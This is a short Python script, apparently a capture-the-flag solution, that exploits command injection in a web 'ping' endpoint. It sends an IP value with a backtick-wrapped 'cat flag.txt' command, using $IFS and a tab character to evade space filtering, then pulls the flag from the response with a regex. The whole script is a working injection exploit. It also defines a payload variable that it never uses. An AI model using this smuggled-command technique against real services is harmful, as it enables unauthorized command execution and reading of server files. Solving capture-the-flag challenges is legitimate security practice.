import requests
import re

payload = "8.8.8.8`cat$IFS/app/flag.txt`"

response = requests.post('ADDRESS:PORT/ping', data={'ip': "8.8.8.8`cat\tflag.txt`"})
data = response.content.decode()
pattern = r"DH\{.*?\}"
match = re.search(pattern, data)
if match:
    flag = match.group(0)
    print("Flag : " + flag)

